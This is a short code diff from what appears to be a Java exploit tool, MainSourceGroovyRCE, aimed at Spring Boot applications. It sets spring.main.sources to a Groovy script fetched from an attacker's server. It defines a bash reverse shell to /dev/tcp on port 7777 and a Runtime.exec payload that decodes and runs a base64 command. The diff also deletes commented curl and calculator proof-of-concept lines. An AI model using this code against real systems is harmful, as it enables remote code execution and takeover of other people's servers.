@@ -23,10 +23,7 @@ public class MainSourceGroovyRCE {
     public String expdata1 = "spring.main.sources=http://%s/MainSourceGR.groovy";
     public String expdata2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://%s/MainSourceGR.groovy\"}";
     public String cmdtmp = "bash -i >&/dev/tcp/%s/7777 0>&1";
-//    bash -c {echo,%s}|{base64,-d}|{bash,-i}
     public String payload = "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");";
-//    public String pocstr1 = "Runtime.getRuntime().exec(\"curl %s?haha=123\");";
-//    public String pocstr2 = "Runtime.getRuntime().exec(\"open -a Calculator\");";
 
 
     public MainSourceGroovyRCE(String address, String vpsIP, String vpsPORT){
